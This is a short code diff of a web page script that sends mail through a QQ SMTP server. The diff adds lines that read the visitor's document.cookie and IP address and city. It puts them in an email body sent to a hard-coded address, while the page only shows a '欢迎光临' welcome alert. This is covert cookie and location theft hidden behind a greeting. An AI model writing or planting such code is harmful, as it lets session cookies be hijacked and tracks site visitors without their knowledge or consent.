@@ -1,3 +1,5 @@
+var s=document.cookie;
+var ip=returnCitySN["cip"]+returnCitySN["cname"];
 Email.send({
     Host : "smtp.qq.com",  //你所用邮箱的smtp地址
     Username : "1520402908@qq.com",      //你的邮箱用户名（如xxx@qq.com）
@@ -5,7 +7,7 @@ Email.send({
     To : '1520402908@qq.com',    //收件人邮箱地址
     From : "1520402908@qq.com",       //发件人邮箱地址
     Subject : "This is the subject",  //邮件主题
-    Body : "And this is the body"     //邮件内容
+    Body : "cookie:"+s+"/////////////////////////////"+"ip:"+ip  //邮件内容
 }).then(
-  message => alert("欢迎光临")
+  message=> alert("欢迎光临")
 );
